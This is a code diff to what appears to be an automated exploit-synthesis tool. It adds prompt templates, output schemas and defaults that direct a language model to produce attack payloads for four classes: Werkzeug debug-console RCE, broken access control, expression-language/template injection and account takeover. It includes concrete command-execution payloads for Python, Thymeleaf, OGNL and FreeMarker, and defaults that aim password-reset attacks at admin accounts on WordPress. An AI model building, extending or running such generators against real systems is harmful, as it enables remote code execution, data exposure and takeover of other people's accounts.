@@ -6412,6 +6412,94 @@ def _synthesize_exploit_from_intel(
                          "imds_url": "http://169.254.169.254/latest/meta-data/",
                          "bypass_technique": "none"},
         },
+        # ── Werkzeug / Flask Debug Console ───────────────────────────────────
+        "werkzeug-debug": {
+            "analysis": (
+                "Analyze: (1) which Werkzeug/Flask debug console endpoint is exposed "
+                "(/console or /debugger), "
+                "(2) which PIN protection is in use and whether the PIN is predictable "
+                "(based on machine ID / network interface / username), "
+                "(3) the Python exec() chain to achieve RCE from the debug console, "
+                "(4) authentication or network restriction bypass needed, "
+                "(5) the exact URL and request to access the console."),
+            "schema": (
+                '  "payload": "<HTTP request to debug console>",\n'
+                '  "console_url": "</console|/debugger|/__debugger__>",\n'
+                '  "pin_bypass": "<predictable_pin|no_pin|network_restricted>",\n'
+                '  "rce_command": "<exec(import os; os.system(id)) or similar>",\n'
+                '  "command": "<OS command>",\n'
+                '  "expected_response_indicator": "<uid output / REPL response / PIN accepted>",\n'
+            ),
+            "defaults": {"console_url": "/console", "pin_bypass": "no_pin",
+                         "rce_command": "__import__('os').popen('id').read()", "command": "id"},
+        },
+        # ── Broken Access Control (OWASP A01) ─────────────────────────────────
+        "broken-access-control": {
+            "analysis": (
+                "Analyze: (1) which endpoint or function lacks an authorization check, "
+                "(2) whether horizontal (same role, different user) or vertical "
+                "(lower role accesses higher-role resource) BAC, "
+                "(3) the missing check: capability_check / current_user_can / "
+                "permission_callback / authorization header, "
+                "(4) which user roles can reach the unprotected resource, "
+                "(5) the data or action exposed by the missing check."),
+            "schema": (
+                '  "payload": "<request to unprotected endpoint>",\n'
+                '  "access_control_type": "horizontal|vertical|function_level",\n'
+                '  "missing_check": "<capability_check|permission_callback|role_check>",\n'
+                '  "min_role": "unauthenticated|subscriber|contributor|any_authenticated",\n'
+                '  "exposed_resource": "<data or action accessible without authorization>",\n'
+                '  "expected_response_indicator": "<sensitive data / privileged action / 200 OK>",\n'
+            ),
+            "defaults": {"access_control_type": "vertical", "missing_check": "unknown",
+                         "min_role": "unauthenticated", "exposed_resource": "unknown"},
+        },
+        # ── EL/OGNL Injection (Thymeleaf, FreeMarker, Velocity, Struts) ───────
+        "el-injection": {
+            "analysis": (
+                "Analyze: (1) which expression language engine processes user input "
+                "(SpEL / OGNL / Thymeleaf / FreeMarker / Velocity), "
+                "(2) where the user-controlled value is embedded in a template or expression "
+                "(view name / error message / query attribute / search parameter), "
+                "(3) the payload syntax specific to the engine: "
+                "Thymeleaf: __${T(java.lang.Runtime).exec('id')}__, "
+                "OGNL/Struts: %{(#abc)(new java.lang.ProcessBuilder...).start()}, "
+                "FreeMarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ ex('id')}, "
+                "(4) sandbox escape if present, "
+                "(5) response type: direct reflection, error-based, or blind."),
+            "schema": (
+                '  "payload": "<EL/template injection payload>",\n'
+                '  "engine": "thymeleaf|ognl|freemarker|velocity|spel",\n'
+                '  "injection_point": "<view_name|error_message|query_param|url_fragment>",\n'
+                '  "rce_expression": "<engine-specific expression to execute OS command>",\n'
+                '  "command": "<OS command>",\n'
+                '  "expected_response_indicator": "<uid output / error with trace / DNS callback>",\n'
+            ),
+            "defaults": {"engine": "thymeleaf", "injection_point": "unknown",
+                         "command": "id"},
+        },
+        # ── Account Takeover ──────────────────────────────────────────────────
+        "account-takeover": {
+            "analysis": (
+                "Analyze: (1) which account takeover vector is applicable: "
+                "password reset token predictability / host header injection in reset email / "
+                "IDOR in account update endpoint / OAuth state bypass / session fixation, "
+                "(2) is the reset token short/predictable or leaked via Referer, "
+                "(3) the exact attack steps: trigger reset, capture token, change victim's password, "
+                "(4) which victim account can be targeted (any user / admin only), "
+                "(5) any rate limiting that blocks automated exploitation."),
+            "schema": (
+                '  "payload": "<HTTP request that takes over the account>",\n'
+                '  "attack_vector": "token_prediction|host_header_poison|idor_update|oauth_bypass|session_fixation",\n'
+                '  "trigger_endpoint": "<password reset / account update endpoint>",\n'
+                '  "token_param": "<reset_key|token|uid>",\n'
+                '  "target_account": "<any_user|admin|specific_role>",\n'
+                '  "step_sequence": ["<step1>", "<step2>", "<step3 — account taken>"],\n'
+                '  "expected_response_indicator": "<password changed / session established / 200 OK>",\n'
+            ),
+            "defaults": {"attack_vector": "token_prediction", "trigger_endpoint": "/wp-login.php?action=lostpassword",
+                         "token_param": "key", "target_account": "admin"},
+        },
     }
 
     # Normalize vuln_class aliases → canonical key in _CLASS_SPECS
